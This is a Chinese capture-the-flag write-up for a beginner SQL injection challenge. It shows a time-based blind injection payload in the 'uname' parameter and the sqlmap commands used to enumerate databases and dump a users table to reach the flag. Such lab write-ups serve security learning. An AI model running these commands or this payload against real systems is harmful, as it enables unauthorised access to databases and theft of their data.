## 题目
- Easy_sqli

## 题目信息
- **URL**: `http://challenge.qsnctf.com:44482/`
- **类型**: SQL注入 (SQLi)
- **难度**: 入门/基础
- **数据库**：MySQL >= 5.0.12
---
## 漏洞点
- **位置**：POST 参数 uname
- **原因**：用户输入未经过滤直接拼接进 SQL 语句


##  完整攻击链

### 发现注入点
- 使用`sqlmap -u "http://challenge.qsnctf.com:44482/" --forms --batch --dbms=mysql --dbs`
返回Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=Skli' AND (SELECT 9544 FROM (SELECT(SLEEP(5)))MlZE) AND 'aDvM'='aDvM&psw=utEI
选择尝试使用盲注
- payloads输入   sqlmap -u "http://challenge.qsnctf.com:44482/login.php" \
  --data="uname=admin&psw=123456" \
  --dbms=mysql --batch \
  --technique=T \
  --time-sec=2 \
  --threads=5 \
  --dbs
返回available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] qsnctf
[*] test

-  选择爆破qsnctf  sqlmap -u "http://challenge.qsnctf.com:44482/login.php" \
  --data="uname=admin&psw=123456" \
  --dbms=mysql --batch \
  --technique=T \
  --time-sec=2 \
  --threads=5 \
  -D qsnctf --tables
找到表users

- 爆破字段   sqlmap -u "http://challenge.qsnctf.com:44482/login.php" \
  --data="uname=admin&psw=123456" \
  --dbms=mysql --batch \
  --technique=T \
  --time-sec=2 \
  --threads=5 \
  -D qsnctf -T users --dump
- 得到flag  `| flag{072d15b43b9c4eb1b1f89c84c129515b} | user     |`


 **成功获取 Flag！**




---

##  补充说明
 **核心思路**：
- 一开始观察到是login界面打算使用burp尝试直接爆破，随便试了个admin，123456直接试出来后观察到/login.php源码内没有任何有用信息后直接使用sqlmap开始爆破